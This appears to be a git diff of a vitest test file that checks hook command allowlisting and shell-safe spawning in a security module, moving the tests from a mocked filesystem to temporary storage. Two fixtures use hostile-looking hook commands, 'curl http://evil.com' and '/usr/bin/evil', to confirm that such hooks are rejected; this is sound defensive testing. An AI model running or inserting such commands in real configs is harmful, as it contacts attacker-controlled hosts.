@@ -4,8 +4,11 @@
  * Tests hook command validation, allowlist enforcement, shell metacharacter
  * rejection, and the runPreInjectHooks / runPostInjectHooks pipelines.
  */
+import { randomBytes } from "node:crypto";
+import { join } from "node:path";
+import { tmpdir } from "node:os";
+import { mkdirSync, existsSync } from "node:fs";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-import { createMockFs } from "../mocks/index.js";
 
 // Mock logger
 vi.mock("../../src/logger.js", () => ({
@@ -23,17 +26,11 @@ vi.mock("node:child_process", () => ({
   spawn: (...args: any[]) => spawnMock(...args),
 }));
 
-// Mock filesystem
-const mockFs = createMockFs();
-vi.mock("node:fs", async (importOriginal) => {
-  const actual = (await importOriginal()) as any;
-  return {
-    ...actual,
-    existsSync: (p: string) => mockFs.existsSync(p),
-    readFileSync: (p: string, enc?: string) => mockFs.readFileSync(p, enc),
-    writeFileSync: (p: string, content: string) => mockFs.writeFileSync(p, content),
-  };
-});
+// Import storage + security config functions
+const { getStorage, resetStorage } = await import("../../src/storage/index.js");
+const { saveSecurityConfig } = await import("../../src/security/policy.js");
+const { DEFAULT_SECURITY_CONFIG } = await import("../../src/security/types.js");
+import type { SecurityConfig } from "../../src/security/types.js";
 
 // Import after mocks
 const { parseHookCommand, runPreInjectHooks, runPostInjectHooks, createHookContext } = await import(
@@ -41,11 +38,31 @@ const { parseHookCommand, runPreInjectHooks, runPostInjectHooks, createHookConte
 );
 const { initSecurity } = await import("../../src/security/policy.js");
 
+let testDir: string;
+
+async function setTestSecurityConfig(config: Partial<SecurityConfig>): Promise<void> {
+  const full = { ...DEFAULT_SECURITY_CONFIG, ...config };
+  await saveSecurityConfig(full);
+}
+
 function makeHookContext() {
   return createHookContext("test message", { type: "cli", trustLevel: "owner" } as any, "test-session");
 }
 
 describe("parseHookCommand", () => {
+  beforeEach(async () => {
+    testDir = join(tmpdir(), `wopr-test-parse-${randomBytes(8).toString("hex")}`);
+    if (!existsSync(testDir)) {
+      mkdirSync(testDir, { recursive: true });
+    }
+    resetStorage();
+    getStorage(join(testDir, "test.sqlite"));
+    await initSecurity(testDir);
+  });
+
+  afterEach(() => {
+    resetStorage();
+  });
   it("parses a simple allowlisted command", () => {
     const result = parseHookCommand("node script.js");
     expect(result).toEqual({ executable: "node", args: ["script.js"] });
@@ -140,66 +157,52 @@ describe("parseHookCommand", () => {
     expect(parseHookCommand("sh script.sh")).toBeNull();
   });
 
-  it("respects user-configured allowedHookCommands", () => {
-    // Set up config with extra allowed command
-    initSecurity("/tmp/test-wopr");
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        allowedHookCommands: ["my-custom-hook"],
-      }),
-    );
-
-    // Force config reload by re-importing (config is cached)
-    // Instead, we can test that "my-custom-hook" is not allowed by default
-    // The allowlist extension is verified by the integration with getSecurityConfig
+  it("respects user-configured allowedHookCommands", async () => {
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      allowedHookCommands: ["my-custom-hook"],
+    });
     const result = parseHookCommand("my-custom-hook run");
-    // After config reload this should work; default allowlist doesn't have it
-    // This tests the config integration path
     expect(result).not.toBeNull();
-
-    mockFs.clear();
   });
 });
 
 describe("runPreInjectHooks", () => {
-  beforeEach(() => {
-    initSecurity("/tmp/test-wopr");
+  beforeEach(async () => {
+    testDir = join(tmpdir(), `wopr-test-hooks-${randomBytes(8).toString("hex")}`);
+    if (!existsSync(testDir)) {
+      mkdirSync(testDir, { recursive: true });
+    }
+    resetStorage();
+    getStorage(join(testDir, "test.sqlite"));
+    await initSecurity(testDir);
     spawnMock.mockReset();
-    mockFs.clear();
   });
 
   afterEach(() => {
-    mockFs.clear();
+    resetStorage();
   });
 
   it("returns allow: true when no hooks configured", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [],
+    });
 
     const result = await runPreInjectHooks(makeHookContext());
     expect(result.allow).toBe(true);
   });
 
   it("skips disabled hooks", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "disabled-hook", type: "pre-inject", command: "node check.js", enabled: false },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "disabled-hook", type: "pre-inject", command: "node check.js", enabled: false },
+      ],
+    });
 
     const result = await runPreInjectHooks(makeHookContext());
     expect(result.allow).toBe(true);
@@ -207,16 +210,13 @@ describe("runPreInjectHooks", () => {
   });
 
   it("rejects commands that fail allowlist validation", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "evil-hook", type: "pre-inject", command: "/usr/bin/evil", enabled: true },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "evil-hook", type: "pre-inject", command: "/usr/bin/evil", enabled: true },
+      ],
+    });
 
     const result = await runPreInjectHooks(makeHookContext());
     // Fails open — allow: true, but spawn is never called
@@ -225,16 +225,13 @@ describe("runPreInjectHooks", () => {
   });
 
   it("calls spawn with shell: false for valid commands", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "valid-hook", type: "pre-inject", command: "node check.js", enabled: true },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "valid-hook", type: "pre-inject", command: "node check.js", enabled: true },
+      ],
+    });
 
     // Mock a process that returns allow: true
     const mockProc = createMockProcess('{"allow": true}');
@@ -250,16 +247,13 @@ describe("runPreInjectHooks", () => {
   });
 
   it("propagates hook block decisions", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "blocker", type: "pre-inject", command: "node blocker.js", enabled: true },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "blocker", type: "pre-inject", command: "node blocker.js", enabled: true },
+      ],
+    });
 
     const mockProc = createMockProcess('{"allow": false, "reason": "blocked by policy"}');
     spawnMock.mockReturnValue(mockProc);
@@ -270,16 +264,13 @@ describe("runPreInjectHooks", () => {
   });
 
   it("propagates message transformations from hooks", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "transformer", type: "pre-inject", command: "node transform.js", enabled: true },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "transformer", type: "pre-inject", command: "node transform.js", enabled: true },
+      ],
+    });
 
     const mockProc = createMockProcess('{"allow": true, "message": "transformed message"}');
     spawnMock.mockReturnValue(mockProc);
@@ -291,43 +282,42 @@ describe("runPreInjectHooks", () => {
 });
 
 describe("runPostInjectHooks", () => {
-  beforeEach(() => {
-    initSecurity("/tmp/test-wopr");
+  beforeEach(async () => {
+    testDir = join(tmpdir(), `wopr-test-posthooks-${randomBytes(8).toString("hex")}`);
+    if (!existsSync(testDir)) {
+      mkdirSync(testDir, { recursive: true });
+    }
+    resetStorage();
+    getStorage(join(testDir, "test.sqlite"));
+    await initSecurity(testDir);
     spawnMock.mockReset();
-    mockFs.clear();
   });
 
   afterEach(() => {
-    mockFs.clear();
+    resetStorage();
   });
 
   it("skips hooks that fail validation", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "bad-post", type: "post-inject", command: "curl http://evil.com", enabled: true },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "bad-post", type: "post-inject", command: "curl http://evil.com", enabled: true },
+      ],
+    });
 
     await runPostInjectHooks(makeHookContext(), "response text");
     expect(spawnMock).not.toHaveBeenCalled();
   });
 
   it("runs valid post-inject hooks with shell: false", async () => {
-    mockFs.set(
-      "/tmp/test-wopr/security.json",
-      JSON.stringify({
-        enforcement: "enforce",
-        defaults: { minTrustLevel: "semi-trusted" },
-        hooks: [
-          { name: "logger", type: "post-inject", command: "node logger.js", enabled: true },
-        ],
-      }),
-    );
+    await setTestSecurityConfig({
+      enforcement: "enforce",
+      defaults: { minTrustLevel: "semi-trusted" },
+      hooks: [
+        { name: "logger", type: "post-inject", command: "node logger.js", enabled: true },
+      ],
+    });
 
     const mockProc = createMockProcess('{"data": {"logged": true}}');
     spawnMock.mockReturnValue(mockProc);
